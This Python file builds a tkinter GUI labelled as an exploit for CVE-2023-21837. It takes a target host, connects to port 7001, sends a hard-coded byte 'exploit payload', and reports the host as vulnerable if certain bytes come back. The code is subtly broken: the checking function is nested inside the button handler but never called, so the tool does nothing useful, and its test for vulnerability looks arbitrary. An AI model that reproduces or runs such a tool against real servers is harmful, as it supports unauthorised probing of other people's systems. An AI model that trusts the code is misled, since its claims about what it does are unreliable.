import socket
import tkinter
from tkinter import *
import tkinter as tk
from tkinter.ttk import *
from time import strftime
from tkinter import ttk
def domin():
    root = tkinter.Tk()
    root.title("CVE-2023-21837 exploits")
    root.geometry('800x600+0+0')
    def printInput():
        inp = inputtxt.get(1.0, "end-1c")
        lbl.config(text = "attack domin : "+inp)
        host = inp
# CVE-2023-21837
        def check_vulnerability(host):
    # create socket object
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # set timeout to 30 seconds
            s.settimeout(30)
            try:
        # connect to target
                s.connect((host, 7001))
        # send exploit payload
                s.send(b'\x49\x49\x4f\x50\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00')
        # receive response
                response = s.recv(1024)
        # check if response indicates vulnerability
                if b'Y\x02\x0f\x00\x00\x00\x00\x00\x00\x00' in response:
                    scroll_y = Scrollbar(root, orient=VERTICAL)
                    txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
                    scroll_y.pack(side=RIGHT, fill=Y)
                    scroll_y.config(command=txtarea.yview)
                  #  print(f"Target {target_host}:{target_port} is vulnerable!")
                    txtarea.insert(END, f"Target {host}:7001 is vulnerable!")
                    txtarea.pack(fill=BOTH, expand=True)
                    txtarea.configure(state ='disabled')
                else:
                    scroll_y = Scrollbar(root, orient=VERTICAL)
                    txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
                    scroll_y.pack(side=RIGHT, fill=Y)
                    scroll_y.config(command=txtarea.yview)
                    txtarea.insert(END, f"Target {host}:7001 is not vulnerable.")
                    txtarea.pack(fill=BOTH, expand=True)
                    txtarea.configure(state ='disabled')
                   # print(f"Target {target_host}:{target_port} is not vulnerable.")
            except socket.timeout:
                scroll_y = Scrollbar(root, orient=VERTICAL)
                txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
                scroll_y.pack(side=RIGHT, fill=Y)
                scroll_y.config(command=txtarea.yview)
                txtarea.insert(END, f"Connection to {host}:7001 timed out.")
                txtarea.pack(fill=BOTH, expand=True)
                txtarea.configure(state ='disabled')
                #print(f"Connection to {host}:7001 timed out.")
            except ConnectionRefusedError:
                scroll_y = Scrollbar(root, orient=VERTICAL)
                txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
                scroll_y.pack(side=RIGHT, fill=Y)
                scroll_y.config(command=txtarea.yview)
                txtarea.insert(END, f"Connection to {host}:7001 was refused.")
                txtarea.pack(fill=BOTH, expand=True)
                txtarea.configure(state ='disabled')
               # print(f"Connection to {host}:7001 was refused.")
            except Exception as e:
                scroll_y = Scrollbar(root, orient=VERTICAL)
                txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
                scroll_y.pack(side=RIGHT, fill=Y)
                scroll_y.config(command=txtarea.yview)
                txtarea.insert(END, f"Error: {e}")
                txtarea.pack(fill=BOTH, expand=True)
                txtarea.configure(state ='disabled')

    Hacher = Label(root, text="Enter ip 127.0.0.1 or domin www.example.com (port=7001) : ").pack()
    inputtxt = tk.Text(root,height = 1,width = 80)
    inputtxt.pack()
    printButton = tk.Button(root,text = "exploit", command = printInput)
    printButton.pack()
    lbl = tk.Label(root, text = "")
    lbl.pack()
    root.mainloop()

# example usage
